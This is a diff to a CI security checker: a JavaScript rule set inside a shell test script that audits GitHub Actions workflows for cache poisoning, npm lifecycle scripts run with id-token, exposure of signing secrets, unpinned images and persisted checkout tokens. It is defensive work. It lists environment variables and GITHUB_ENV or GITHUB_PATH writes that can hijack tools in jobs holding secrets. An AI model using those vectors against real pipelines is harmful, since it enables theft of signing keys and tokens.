+        const isCache = (x, kind) => x !== undefined && x.via === via && new RegExp("^actions/cache" + kind + "@").test(String(x.st.uses ?? "").toLowerCase());
+        // with: keyed in lower case; null when two keys differ only by case.
+        const lower = (w) => {
+          const m = {};
+          for (const [k, v] of Object.entries(w ?? {})) { const l = k.toLowerCase(); if (l in m) return null; m[l] = v; }
+          return m;
+        };
+        const w = lower(s.with);
+        const rk = w?.["restore-keys"];
+        const prefixed = rk !== undefined && rk !== null && String(rk).trim() !== "";
+        const onlyThese = (x) => x !== null && Object.keys(x).every((k) => ["path", "key", "lookup-only"].includes(k));
+        if (authority || callable) out.push(label + ": restores from the Actions cache (writable by any run on main)");
+        else if (prefixed) out.push(label + ": restores by a key prefix (restore-keys), not by its exact key only");
+        else if (!onlyThese(w)) out.push(label + ": takes inputs other than path, key and lookup-only, or one spelled twice");
+        else if (/^actions\/cache\/restore@/.test(uses)) {
+          // Only as the lookup in front of the actions/cache step below.
+          const next = flat[i + 1];
+          if (String(w["lookup-only"]) !== "true" || !isCache(next, ""))
+            out.push(label + ": actions/cache/restore here is not a lookup-only step right before the actions/cache step it gates");
+        } else {
+          const prev = flat[i - 1], next = flat[i + 1];
+          const pw = prev !== undefined ? lower(prev.st.with) : null;
+          const lid = isCache(prev, "/restore") ? String(prev.st.id ?? "") : "";
+          const gated = lid !== "" && onlyThese(pw) && String(pw["lookup-only"]) === "true" &&
+            one(pw.key) === one(w.key) && one(pw.path) === one(w.path) &&
+            one(w["lookup-only"]) === "${{ " + hitIs(lid) + " }}";
+          if (!gated)
+            out.push(label + ": not gated by a lookup-only actions/cache/restore of the same key and path right before it (lookup-only: ${{ steps.<lookup id>.outputs.cache-hit != \x27true\x27 }}), so a prefix match is extracted");
+          const id = String(s.id ?? "");
+          const paths = String(w.path ?? "").split("\n").map((x) => x.trim()).filter(Boolean);
+          const d = next !== undefined && next.via === via ? next.st : undefined;
+          const env = d?.env ?? {};
+          const removed = new Set(), used = new Set();
+          const lines = d && typeof d.run === "string" ? d.run.split("\n").map((x) => x.trim()).filter(Boolean) : [];
+          // Names that change what the discard runs: never in its env (but
+          // GOMODCACHE, for go clean -modcache), nor in the job, workflow or
+          // enclosing step env that reaches it (#1047 review 3).
+          const steer = /^(?:GO[A-Z0-9_]*|BASH_ENV|ENV|HOME|PATH|IFS|PS4|SHELLOPTS|BASHOPTS|LD_[A-Z0-9_]*|BASH_FUNC_.*|XDG_[A-Z0-9_]*|APPDATA|LOCALAPPDATA|USERPROFILE)$/i;
+          const fromEnv = (k) => typeof env[k] === "string" && !env[k].trim().startsWith("~");
+          const plain = lines.length > 0 && lines.every((l) => {
+            let m;
+            if (l === "go clean -modcache" && fromEnv("GOMODCACHE")) { removed.add(env.GOMODCACHE.trim()); used.add("GOMODCACHE"); return true; }
+            if ((m = /^rm -rf (?:-- )?"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?"$/.exec(l)) && fromEnv(m[1]) && (m[1] === "GOCACHE" || !steer.test(m[1]))) { removed.add(env[m[1]].trim()); used.add(m[1]); return true; }
+            if ((m = /^rm -rf (?:-- )?([^\s"\x27$;&|`<>()]+)$/.exec(l))) { removed.add(m[1]); return true; }
+            return false;
+          });
+          // An env this rule cannot read as a mapping (one expression for the
+          // whole block) could hold any of them (#1047 review 4).
+          const mapping = (e) => e === undefined || e === null || (typeof e === "object" && !Array.isArray(e) && Object.keys(e).every((k) => !k.includes("${{")));
+          const steered = Object.keys({ ...(doc.env ?? {}), ...(job.env ?? {}), ...(next?.penv ?? {}) }).filter((k) => steer.test(k));
+          if (![doc.env, job.env, next?.penv, d?.env].every(mapping)) steered.push("an env this rule cannot read as a mapping");
+          // ...and so could any step before it that writes GITHUB_ENV or
+          // GITHUB_PATH at run time: only a literal NAME=value echoed or
+          // printed into GITHUB_ENV, under a name steer does not match, is
+          // read (#1047 review 4). What actions write there (setup-go puts Go
+          // on PATH) is not readable here and is not checked.
+          for (const { st: b } of flat.slice(0, i + 1)) {
+            const run = typeof b.run === "string" ? b.run : "";
+            if (/GITHUB_PATH/.test(run)) steered.push("GITHUB_PATH (written by an earlier step)");
+            for (const l of run.split("\n").filter((x) => /GITHUB_ENV/.test(x))) {
+              const names = [...l.matchAll(/(?:^|[\s;&|(])(?:echo|printf)\s+["\x27]?([A-Za-z_][A-Za-z0-9_]*)=[^>]*?["\x27]?\s*>>\s*"?\$\{?GITHUB_ENV\}?"?/g)].map((m) => m[1]);
+              if (names.length !== (l.match(/GITHUB_ENV/g) ?? []).length) steered.push("GITHUB_ENV written in a form this rule cannot read (by an earlier step)");
+              for (const n of names) if (steer.test(n)) steered.push(n + " (written to GITHUB_ENV by an earlier step)");
+            }
+          }
+          const discards = id !== "" && d !== undefined && one(d.if) === hitIs(id) &&
+            Object.keys(d).every((k) => ["name", "if", "shell", "env", "run"].includes(k)) && d.shell === "bash" &&
+            plain && Object.keys(env).every((k) => used.has(k)) && steered.length === 0 &&
+            paths.length > 0 && paths.every((p) => removed.has(p));
+          if (!discards)
+            out.push(label + ": a restore that is not an exact key match is not discarded by the step right after it (if: " + hitIs(id || "<id>") + ", shell bash, rm -rf or go clean -modcache of every cached path and nothing else, env only what those lines read" + (steered.length ? "; the job, workflow or enclosing step sets " + steered.join(", ") : "") + ")");
+        }
+      }
+      // setup-node turns on its npm cache when package.json names npm as
+      // packageManager, unless told not to (#1046 review).
+      if (uses.startsWith("actions/setup-node@") && (String(s.with?.["package-manager-cache"]) !== "false" || s.with?.cache !== undefined))
+        out.push(label + ": setup-node without package-manager-cache: false, or with cache:, restores from the Actions cache");
       if (uses.startsWith("actions/setup-go@") && String(s.with?.cache) !== "false")
         out.push(label + ": setup-go without cache: false restores modules and build output from the Actions cache");
       if (uses.startsWith("docker/setup-qemu-action@")) {
@@ -1189,6 +1586,52 @@ if (rule === "narrow") {
         if (cmd("(?:bun|bunx|npx|yarn|pnpm|node|make|python3?|perl|ruby|deno|go)\\b").test(line) ||
             (npmRuns.test(line) && !(isGlobal(line) && !globalOther(line))) || globalOther(line))
           out.push(name + ": publishes with id-token and runs: " + line);
+      // #1046: npm version and a directory npm publish run the lifecycle
+      // scripts of the package.json they act on (preversion, version,
+      // postversion, prepublishOnly, prepack, prepare, postpack, publish,
+      // postpublish: all nine ran on npm 12.1.0 without the flag, none with
+      // it), so each carries --ignore-scripts. A publish of a .tgz path runs
+      // none (measured too), which is the publish-brain shape. npm takes any
+      // unambiguous abbreviation of a command (npm vers, npm publi) and the
+      // alias verison, so a verb is counted when it starts either word.
+      // runAllow pins the exact forms as well; this says why.
+      const npmVerb = new RegExp(cmd("npm(?:\\s+-\\S+)*\\s+([A-Za-z-]+)").source, "g");
+      for (const line of lines)
+        for (const m of line.matchAll(npmVerb)) {
+          const v = m[1].toLowerCase();
+          // From the npm word to the end of that command. A relative path
+          // ending in npm (find sidecar/npm ...) is an argument that cmd
+          // happens to match, not a program: a program is npm or a path
+          // from / or ./ (the same reading as the rest of this rule).
+          const at = m.index + m[0].lastIndexOf("npm");
+          const word = m[0].slice(0, m[0].lastIndexOf("npm")).split(/[\s"$(`=]/).pop();
+          if (word !== "" && !/^\.?\//.test(word)) continue;
+          const seg = line.slice(at).split(/[|;&)]/)[0];
+          // An option before the verb hides it from this rule (npm
+          // --loglevel warn publish reads warn as the verb), so only
+          // npm --version goes that way (security review of #1046).
+          if (/^npm\s+-/.test(seg) && !/^npm\s+--version\s*$/.test(seg)) {
+            out.push(name + ": runs npm with an option before its command, which this rule does not read (#1046): " + line);
+            continue;
+          }
+          if (v.length < 2 || !["version", "verison", "publish"].some((w) => w.startsWith(v))) continue;
+          // npm reads the last of these, and a value after the flag or a
+          // --no- form turns it off (measured on npm 12.1.0).
+          // npm expands any unique prefix of an option, so every option
+          // that could expand to ignore-scripts, negated or given a value,
+          // is refused but the exact --ignore-scripts. A program run by a
+          // relative path (bin/npm) is not read here; runAllow pins every
+          // npm form, and refuses any command name that is a path, for that.
+          const igs = [...seg.matchAll(/(?:^|\s)(--(?:no-)?ig[^\s=]*)(=\S*|\s+(?:true|false)\b)?/g)];
+          if (igs.some((g) => g[1] !== "--ignore-scripts" || g[2] !== undefined))
+            out.push(name + ": runs npm " + m[1] + " with --ignore-scripts given a value or negated (#1046): " + line);
+          const isVersion = ["version", "verison"].some((w) => w.startsWith(v));
+          if (isVersion && !/(?:^|\s)--workspaces=false(?=\s|$)/.test(seg))
+            out.push(name + ": runs npm " + m[1] + " without --workspaces=false, which installs a workspace root above the package with id-token in reach (#1046): " + line);
+          if (/(?:^|\s)--ignore-scripts(?=\s|$)/.test(seg)) continue;
+          if (/\bnpm\s+publish\s+"[^"]*\.tgz"/.test(seg.replace(/\$\{TARBALL\}/g, "x.tgz"))) continue;
+          out.push(name + ": runs npm " + m[1] + " without --ignore-scripts, which runs package.json lifecycle scripts with id-token in reach (#1046): " + line);
+        }
     }
     // #999: in a job holding id-token, no env names code to run before or
     // inside the steps. BASH_ENV and ENV name a file the shell sources
@@ -1348,12 +1791,98 @@ if (rule === "narrow") {
         if (String(st.uses ?? "").startsWith("./"))
           out.push(name + ": runs local action " + st.uses + " in a job holding id-token");
     }
+    // #870: the same for a job that reads a secret other than GITHUB_TOKEN.
+    // The Apple signing certificate, its password and the App Store Connect
+    // key are long-lived: unlike a federated token they do not expire with
+    // the job, and the signer imports them into a keychain and a file. So a
+    // compiler, a Go module, cgo, a Makefile, a package manager or a
+    // repository script run in that job could read them out. The build
+    // happens in a job without them (build-sidecar-darwin-*, build-macos),
+    // and the result crosses to the signer with its digest. Only checkout
+    // and the artifact actions run there, and a secret at the workflow level
+    // reaches every job, so it counts for all of them.
+    const secretHeld = [...JSON.stringify({ env: doc.env, job }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
+      .some((m) => /\bsecrets\b(?!\s*\.\s*GITHUB_TOKEN\b)/i.test(m[1]));
+    // The Apple and App Store Connect secrets are held to this in EVERY
+    // workflow, release path or not (#870 review): a new workflow handed
+    // them (a nightly notarization test, say) must not escape the rule.
+    const appleHeld = /\bsecrets\s*(?:\.\s*|\[\s*\\?[\x27"])(?:APPLE_|ASC_)/i.test(JSON.stringify({ env: doc.env, job }));
+    if ((release && secretHeld || appleHeld) && typeof job.uses !== "string") {
+      // Every shell plain, as in a job holding id-token: shell: node {0} or
+      // python {0} runs the script in an interpreter this rule cannot read.
+      const plainShellS = ["bash", "sh", "bash -e {0}", "sh -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
+      for (const st of steps) {
+        const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
+        if (sh !== undefined && !plainShellS.includes(String(sh).trim()))
+          out.push(name + ": step " + JSON.stringify(st.name ?? st.id ?? st.uses ?? "") + " runs in shell: " + sh + " in a job holding a signing secret (#870 review)");
+      }
+      // No env that names code to run first or changes what the tools load
+      // (the id-token list, plus the dynamic loader on macOS), and nothing
+      // written to GITHUB_ENV or GITHUB_PATH for later steps.
+      // CODESIGN_ALLOCATE names the helper codesign runs; DEVELOPER_DIR,
+      // TOOLCHAINS, SDKROOT and xcrun_* choose what xcrun runs; PERL5OPT and
+      // friends load code into shasum, a Perl script on macOS (#870 review).
+      const poisonS = /^(?:BASH_ENV|ENV|PATH|NODE_OPTIONS|LD_[A-Z0-9_]+|DYLD_[A-Z0-9_]+|CODESIGN_ALLOCATE|DEVELOPER_DIR|TOOLCHAINS|SDKROOT|xcrun_[A-Za-z0-9_]+|PERL5OPT|PERL5LIB|PERLLIB|PERL5DB|PERL_[A-Z0-9_]+|BASH_FUNC_.+|SHELLOPTS|BASHOPTS|PS4|(?:HTTPS?|ALL|NO|FTP)_PROXY|SSL_CERT_(?:FILE|DIR)|CURL_CA_BUNDLE|HOME|TMPDIR|CDPATH|OPENSSL_(?:CONF|MODULES|ENGINES)|GITHUB_.+|RUNNER_.+|ACTIONS_.+)$/i;
+      for (const [lvl, e] of [["workflow", doc.env], ["job", job.env], ...steps.map((st) => ["step " + JSON.stringify(st.name ?? st.id ?? st.uses ?? ""), st.env])])
+        for (const k of Object.keys(e && typeof e === "object" ? e : {}))
+          if (poisonS.test(k)) out.push(name + ": " + lvl + " env sets " + k + " in a job holding a signing secret (#870 review)");
+      for (const st of steps) {
+        const text = [typeof st.run === "string" ? st.run : "", ...Object.values(st.env && typeof st.env === "object" ? st.env : {}).map(String)].join("\n");
+        if (/GITHUB_(?:ENV|PATH)\b|_runner_file_commands/i.test(text))
+          out.push(name + ": step " + JSON.stringify(st.name ?? st.id ?? st.uses ?? "") + " writes GITHUB_ENV or GITHUB_PATH in a job holding a signing secret (#870 review)");
+        const run = (typeof st.run === "string" ? st.run : "").replace(/\\\n/g, " ").split("\n").map(stripComment).join("\n");
+        for (const m of run.matchAll(/(?:^|[\s;&|(`])(?:(?:export|declare|typeset|local|readonly|env)\s+(?:-\w+\s+)*)?([A-Za-z_][A-Za-z0-9_]*)\+?=/gm))
+          if (poisonS.test(m[1])) out.push(name + ": step " + JSON.stringify(st.name ?? st.id ?? "") + " sets " + m[1] + " in its script, in a job holding a signing secret (#870 review)");
+      }
+      for (const line of lines) {
+        // Code the build job made, or the checkout carries, run as a
+        // program: a program named by a variable, one inside a bundle, open,
+        // or a path into the checkout (an extensionless script too).
+        // Read with its own command-position rule: the cmd() prefix takes
+        // any directory in front of a program, which here would read every
+        // "${RUNNER_TEMP}/x" argument as a program.
+        if (new RegExp("(?:^\\(?\\s*|[;&|`{]\\s*|!\\s+|\\$\\(\\s*|\\b(?:then|do|else|if|elif|while|until|exec|command|env|sudo|nohup|time|xargs)\\s+)" +
+            "(?:open(?=$|[\\s;&|)])|\"?\\$\\{?[A-Za-z_]|[^\\s;&|\"]*\\.app/|\"?(?:\\./|\\.\\./|sidecar/|packaging/|scripts/|\\.github/))").test(line))
+          out.push(name + ": runs a program from a variable, a bundle or the checkout in a job holding a signing secret (#870 review): " + line);
+        // ...or has another program run one for it (#870 review).
+        if (/(?:^|[\s;&|(])find\b[^;&|]*\s-(?:exec|execdir|ok|okdir)\b/.test(line) || /\bawk\b.*(?:\bsystem\s*\(|\|\s*getline\b|\bprint\b[^\n]*\|\s*["\x27$])/.test(line) || cmd("xargs(?=$|\\s)").test(line))
+          out.push(name + ": runs programs through find -exec, xargs or awk system() in a job holding a signing secret (#870 review): " + line);
+        if (cmd("go(?:\\s|$)").test(line) || /build-sidecar\.sh/.test(line) ||
+            cmd("(?:bun|bunx|npx|yarn|pnpm|node|make|gmake|swiftc|swift|xcodebuild|clang|gcc|cc|ld|cargo|cmake|python3?|perl|ruby)(?=$|[\\s;&|)])").test(line) ||
+            npmRuns.test(line))
+          out.push(name + ": builds or runs build tooling in a job holding a signing secret (#870): " + line);
+        // xcrun runs any developer tool by name (clang, swiftc, make): only
+        // the two the signer needs.
+        if (cmd("xcrun(?=$|\\s)").test(line) && !cmd("xcrun\\s+(?:notarytool|stapler)\\s").test(line))
+          out.push(name + ": runs xcrun other than notarytool or stapler, which can run build tooling, in a job holding a signing secret (#870): " + line);
+        if (cmd("(?:apt-get|apt|dpkg|snap|brew|port|yum|dnf|apk|pip3?|pipx|uv|conda|nix|nix-env|gem|cargo|choco|winget|softwareupdate|installer)(?=$|[\\s;&|)])").test(line))
+          out.push(name + ": installs packages in a job holding a signing secret (#870): " + line);
+        if (cmd("(?:(?:ba|z|da)?sh\\s+-\\S*c|eval|source|\\.)(?:\\s|$)").test(line))
+          out.push(name + ": runs shell text or sources a file in a job holding a signing secret, which this rule cannot see into (#870): " + line);
+        // A repository script is code this rule does not read: the signer
+        // runs only what its own steps say (packaging/macos/make-icns.sh and
+        // the Makefile stay in the build job).
+        if (cmd("[\\w.-]+\\.(?:sh|bash|py|rb|pl|js|mjs|cjs|ts)(?=$|[\\s;&|)])").test(line))
+          out.push(name + ": runs a repository script in a job holding a signing secret (#870): " + line);
+      }
+      for (const [lvl, e] of [["workflow", doc.env], ["job", job.env], ...steps.map((st) => ["step " + (st.name ?? st.id ?? st.uses ?? ""), st.env])])
+        for (const k of Object.keys(e && typeof e === "object" ? e : {}))
+          if (/^(?:CGO_[A-Z_]+|CC|CXX|GOFLAGS|GOOS|GOARCH)$/i.test(k)) out.push(name + ": " + lvl + " env sets " + k + " (a Go or C build) in a job holding a signing secret (#870)");
+      const okSecretUses = ["actions/checkout@", "actions/download-artifact@", "actions/upload-artifact@"];
+      for (const st of steps) {
+        const u = String(st.uses ?? "");
+        if (u && !okSecretUses.some((a) => u.toLowerCase().startsWith(a)))
+          out.push(name + ": uses " + u + " in a job holding a signing secret (only checkout and artifact transfer) (#870)");
+      }
+      if (job.container !== undefined || job.services !== undefined) out.push(name + ": runs a container or services in a job holding a signing secret (#870)");
+    }
     // Artifacts are writable by every job in the run, so on the release path
     // a job holding id-token or a write scope takes one only by digest
     // (#781): the step right after each download runs `sha256sum -c` on a
     // digest that arrives as a job output (`needs.<job>.outputs`, which only
-    // that job can set), under the same condition as the download.
-    const privileged = oidc || perm === "write-all" || (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
+    // that job can set), under the same condition as the download. A job
+    // holding a signing secret too (#870): what it signs is what it ships.
+    const privileged = oidc || secretHeld || perm === "write-all" || (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
     if (release && privileged) {
       // Action names are case-insensitive to GitHub.
       const isDownload = (st) => String(st.uses ?? "").toLowerCase().startsWith("actions/download-artifact@");
@@ -1382,7 +1911,10 @@ if (rule === "narrow") {
         const label = name + ": download " + JSON.stringify(st.with?.name ?? st.with?.pattern ?? "(all)");
         // The check, on a line that is not a comment, not excused by || true.
         const code = typeof next?.run === "string" ? next.run.split("\n").filter((l) => !/^\s*#/.test(l)).join("\n") : "";
-        const checkLine = code.split("\n").find((l) => /\bsha256sum\b[^\n]*\s-c\b/.test(l));
+        // sha256sum, or on a macOS runner (#870), which has shasum and not
+        // always sha256sum, shasum -a 256: the same check, the same hex.
+        const SUM = "(?:sha256sum|shasum\\s+-a\\s*256)";
+        const checkLine = code.split("\n").find((l) => new RegExp("\\b" + SUM + "\\b[^\\n]*\\s-c\\b").test(l));
         // The env vars that carry a job-output digest; the script must read
         // one of them, not merely have it in scope.
         const carriers = Object.entries(next?.env ?? {})
@@ -1393,6 +1925,19 @@ if (rule === "narrow") {
           out.push(label + " is checked against no needs.<job>.outputs digest");
         else if (!carriers.some((k) => new RegExp("\\$\\{?" + k + "\\b").test(code)))
           out.push(label + " has a needs.<job>.outputs digest in env that its check never reads");
+        // shasum picks the algorithm in check mode from the length of the
+        // digest and ignores -a (#870 review: a 40-hex SHA-1 line passes
+        // shasum -a 256 -c), so where it checks, every digest it reads must
+        // be held to 64 hex first, in the same step: by name, or by ${!v}
+        // over a for list that names it.
+        else if (!/\bsha256sum\b/.test(checkLine) && !carriers.every((k) =>
+            new RegExp("\\[\\[\\s*\"\\$\\{?" + k + "\\}?\"\\s*=~\\s*\\^\\[0-9a-f\\]\\{64\\}\\$\\s*\\]\\]").test(code.slice(0, code.indexOf(checkLine))) ||
+            (/\[\[\s*"\$\{!v\}"\s*=~\s*\^\[0-9a-f\]\{64\}\$\s*\]\]/.test(code.slice(0, code.indexOf(checkLine))) && new RegExp("\\bfor\\s+v\\s+in\\b[^;\\n]*\\b" + k + "\\b").test(code.slice(0, code.indexOf(checkLine))))))
+          out.push(label + " is checked with shasum, which takes the algorithm from the digest length, without first holding every digest to 64 hex");
+        // ...and a failed hold stops the step (#870 review: || : passed).
+        else if (!/\bsha256sum\b/.test(checkLine) && code.slice(0, code.indexOf(checkLine)).split("\n").filter((l) => /=~\s*\^\[0-9a-f\]\{64\}\$/.test(l))
+            .some((l) => !/\]\]\s*\|\|\s*(?:\{\s*(?:[^;]*;\s*)*exit\s+[1-9][0-9]*\s*;?\s*\}|exit\s+[1-9][0-9]*)\s*;?\s*$/.test(l.trim())))
+          out.push(label + " is checked with shasum after a 64-hex hold whose failure does not stop the step");
         // Its failure must end the step: no || after it (on its line or
         // continued onto the next), no if or ! around it, no set +e, and no
         // shell other than the default bash -e.
@@ -1400,7 +1945,7 @@ if (rule === "narrow") {
         // (GitHub default shell is bash -e, without pipefail), a trailing &,
         // or a $( ) or backtick around it would each take its exit status.
         else if (/\|\|/.test(checkLine) || /^\s*(?:if|elif|while|until)\b|^\s*!/.test(checkLine) ||
-                 !/\bsha256sum\b[^|;&)`]*\s-c\b[^|;&)`]*$/.test(checkLine) || /\$\(|`/.test(checkLine.split(/\bsha256sum\b/).slice(-2, -1)[0] ?? "") ||
+                 !new RegExp("\\b" + SUM + "\\b[^|;&)`]*\\s-c\\b[^|;&)`]*$").test(checkLine) || /\$\(|`/.test(checkLine.split(new RegExp("\\b" + SUM + "\\b")).slice(-2, -1)[0] ?? "") ||
                  /(?:^|[;&|]\s*)set\s+\+o\s+pipefail\b/m.test(code) ||
                  /(?:^|[;&|]\s*)set\s+\+[a-z]*e/m.test(code) || /(?:^|[;&|]\s*)set\s+\+o\s+errexit/m.test(code) ||
                  (next.shell !== undefined && !/^bash\s+-e\b|^bash$/.test(String(next.shell))))
@@ -1707,6 +2252,109 @@ if (rule === "npmpin") {
     }
   }
 }
+if (rule === "images") {
+  // (#1048) Every container: and services: image, and every docker:// step,
+  // in every workflow, by digest. The runner pulls each before any step
+  // runs, by whatever the tag points at then, and runs it with the job.
+  const envRef = /\$\{\{\s*env\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}/g;
+  const digest = /@sha256:[0-9a-f]{64}$/;
+  for (const [name, job] of Object.entries(jobs)) {
+    const resolve = (v) => String(v ?? "").replace(envRef, (m, k) => {
+      for (const e of [job.env, doc.env]) if (e && typeof e === "object" && k in e) return String(e[k]);
+      return m;
+    }).trim();
+    const pinned = (img) => digest.test(resolve(img));
+    if (job.container !== undefined) {
+      const img = typeof job.container === "object" && job.container !== null ? job.container.image : job.container;
+      if (!pinned(img)) out.push(name + ": container image is not pinned by digest (" + JSON.stringify(String(img ?? "")) + ")");
+    }
+    if (job.services !== undefined) {
+      if (job.services === null || typeof job.services !== "object") out.push(name + ": services is not a mapping this rule can read");
+      else
+        for (const [sv, def] of Object.entries(job.services)) {
+          const img = typeof def === "object" && def !== null ? def.image : def;
+          if (!pinned(img)) out.push(name + ": service " + sv + " image is not pinned by digest (" + JSON.stringify(String(img ?? "")) + ")");
+        }
+    }
+    for (const { st, via } of flatSteps(job.steps)) {
+      const u = String(st.uses ?? "");
+      if (u.toLowerCase().startsWith("docker://") && !digest.test(u))
+        out.push(name + (via ? " (via " + via.slice(0, -3) + ")" : "") + ": runs " + u + ", not pinned by digest");
+      // A local Docker action runs its image, or builds one from its
+      // Dockerfile, whose FROM this rule does not read: only a docker://
+      // image by digest passes (#1048 review).
+      if (u.startsWith("./") && !/\.ya?ml$/.test(u)) {
+        let action = null;
+        for (const f of ["action.yml", "action.yaml"])
+          try { action = Bun.YAML.parse(require("node:fs").readFileSync(process.env.REPO + "/" + u.slice(2).replace(/\/$/, "") + "/" + f, "utf8")); break; } catch {}
+        const img = String(action?.runs?.image ?? "");
+        if (action?.runs?.using === "docker" && !(img.toLowerCase().startsWith("docker://") && digest.test(img)))
+          out.push(name + (via ? " (via " + via.slice(0, -3) + ")" : "") + ": runs the local Docker action " + u + " (image " + JSON.stringify(img) + "), not pinned by digest");
+      }
+    }
+  }
+}
+if (rule === "persist") {
+  // (#1001) No checkout anywhere leaves its token in .git/config, whatever
+  // the workflow holds. The narrower checks in untrusted and narrow came
+  // first; this one covers the read-only workflows too, whose later steps
+  // run the code of the PR under test, which can read that file.
+  // Input names are case-insensitive to GitHub, so a second spelling of the
+  // key is read too: exactly one, and false (#1001 review).
+  for (const [name, job] of Object.entries(jobs)) {
+    // A remote reusable workflow runs steps this rule cannot read.
+    if (typeof job.uses === "string" && !job.uses.startsWith("./"))
+      out.push(name + ": calls the remote workflow " + job.uses + ", whose checkouts this rule cannot see");
+    for (const { st, via } of flatSteps(job.steps)) {
+      if (!String(st.uses ?? "").toLowerCase().startsWith("actions/checkout@")) continue;
+      const set = Object.entries(st.with ?? {}).filter(([k]) => k.toLowerCase() === "persist-credentials");
+      if (set.length !== 1 || set[0][1] !== false)
+        out.push(name + (via ? " (via " + via.slice(0, -3) + ")" : "") + ": checkout leaves the token in .git/config (persist-credentials is not false)");
+    }
+  }
+}
+if (rule === "license-scan") {
+  // (#971) The weekly catalog sync license-checks what the hosted shared
+  // build would install, every run: one step runs exactly the scan with
+  // --install and nothing else on its line (no || or ; to swallow it),
+  // nothing lets it fail quietly (continue-on-error or an if, on the job, the
+  // scan, or the steps that fetch and place the regenerated catalog), and
+  // the regenerated catalog is put in place BEFORE the scan.
+  const exact = /^bun run scripts\/check-piece-licenses\.ts --install "\$RUNNER_TEMP\/license-scan" --summary-md "\$GITHUB_STEP_SUMMARY"$/;
+  const found = [];
+  for (const [name, job] of Object.entries(jobs)) {
+    const steps = flatSteps(job.steps).map(({ st }) => st);
+    const scanAt = steps.findIndex((st) => typeof st.run === "string" && /\bscripts\/check-piece-licenses\.ts\b/.test(st.run));
+    if (scanAt < 0) continue;
+    found.push(name);
+    const scan = steps[scanAt];
+    if (!/\bbun run scripts\/check-piece-licenses\.ts --install\b/.test(scan.run))
+      out.push(name + ": the license scan does not install the catalog (--install)");
+    if (!exact.test(scan.run.trim()))
+      out.push(name + ": the license scan step runs something besides the scan, which could swallow its failure");
+    const loud = (st, what) => {
+      if (st["continue-on-error"]) out.push(name + ": " + what + " may fail without failing the run (continue-on-error)");
+      if (st.if !== undefined) out.push(name + ": " + what + " is conditional, so some weekly runs skip it");
+    };
+    loud(job, "the license scan job");
+    loud(scan, "the license scan");
+    const needs = [].concat(job.needs ?? []);
+    if (!needs.includes("generate"))
+      out.push(name + ": the license scan does not run after generate, so it checks the old catalog");
+    const copyAt = steps.findIndex((st) => typeof st.run === "string" &&
+      /catalog-sync\/catalog-generated\.ts"?\s+src\/workflows\/pieces-library\/catalog-generated\.ts/.test(st.run));
+    if (copyAt < 0 || copyAt > scanAt) out.push(name + ": the license scan does not put the regenerated catalog in place first");
+    else {
+      loud(steps[copyAt], "putting the regenerated catalog in place");
+      if (steps[copyAt].run.trim() !== "cp \"$RUNNER_TEMP/catalog-sync/catalog-generated.ts\" src/workflows/pieces-library/catalog-generated.ts")
+        out.push(name + ": the step that puts the regenerated catalog in place runs something besides the copy");
+    }
+    const getAt = steps.findIndex((st) => String(st.uses ?? "").startsWith("actions/download-artifact@") && st.with?.name === "catalog-sync");
+    if (getAt < 0 || getAt > copyAt) out.push(name + ": the license scan does not download the generated catalog first");
+    else loud(steps[getAt], "downloading the generated catalog");
+  }
+  if (found.length !== 1) out.push("expected exactly one license scan step (scripts/check-piece-licenses.ts), found " + found.length);
+}
 if (rule === "pinned") {
   const uses = [];
   for (const [name, job] of Object.entries(jobs)) {
@@ -1718,7 +2366,9 @@ if (rule === "pinned") {
       out.push(name + ": uses " + u + " (not a full commit SHA)");
 }
 if (out.length) console.log(out.join("\n"));
-'
+' >"${WORK}/check.mjs"
+	fi
+	RULE="$1" FILE="$2" REPO="${REPO_DIR:-${HERE}/../..}" bun "${WORK}/check.mjs"
 }
 
 # expect_clean <label> <rule> <file>
@@ -1768,6 +2418,90 @@ for f in "$WORKFLOWS"/*.yml; do
 done
 
 echo
+echo "no checkout leaves its token in .git/config, in any workflow (#1001)"
+for f in "$WORKFLOWS"/*.yml; do
+	expect_clean "$(basename "$f")" persist "$f"
+done
+expect_caught 'a read-only PR workflow checkout back to the default (#1001)' persist "$WORKFLOWS/test.yml" \
+	$'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - uses: dorny/paths-filter@' \
+	$'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - uses: dorny/paths-filter@' \
+	'changes: checkout leaves the token in .git/config'
+expect_caught 'the image build checkout back to the default (#1001)' persist "$WORKFLOWS/docker-build.yml" \
+	$'        with:\n          persist-credentials: false\n\n      - name: Set up Docker Buildx' \
+	$'\n      - name: Set up Docker Buildx' \
+	'docker-build: checkout leaves the token in .git/config'
+expect_caught 'persist-credentials set to true on a read-only checkout (#1001)' persist "$WORKFLOWS/test.yml" \
+	$'          persist-credentials: false\n      - name: Parse every plist' \
+	$'          persist-credentials: true\n      - name: Parse every plist' \
+	'plist-lint: checkout leaves the token in .git/config'
+expect_caught 'a checkout spelled in another case (#1001)' persist "$WORKFLOWS/test.yml" \
+	$'      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - name: Parse every plist' \
+	$'      - uses: Actions/Checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - name: Parse every plist' \
+	'plist-lint: checkout leaves the token in .git/config'
+expect_caught 'persist-credentials spelled a second way, set to true (#1001 review)' persist "$WORKFLOWS/test.yml" \
+	$'          persist-credentials: false\n      - name: Parse every plist' \
+	$'          Persist-Credentials: true\n          persist-credentials: false\n      - name: Parse every plist' \
+	'plist-lint: checkout leaves the token in .git/config'
+expect_caught 'a remote reusable workflow, whose checkouts cannot be read (#1001 review)' persist "$WORKFLOWS/test.yml" \
+	$'\n  plist-lint:\n' $'\n  remote:\n    uses: octo/ci/.github/workflows/build.yml@3d3c42e5aac5ba805825da76410c181273ba90b1\n  plist-lint:\n' \
+	'remote: calls the remote workflow octo/ci/.github/workflows/build.yml@'
+# ...and one reached through a local composite action, which the rule
+# expands like every other rule that reads steps.
+rm -rf "${WORK}/persist-repo" && mkdir -p "${WORK}/persist-repo/.github/actions/co"
+printf '%s\n' 'name: co' 'description: checkout' 'runs:' '  using: composite' '  steps:' \
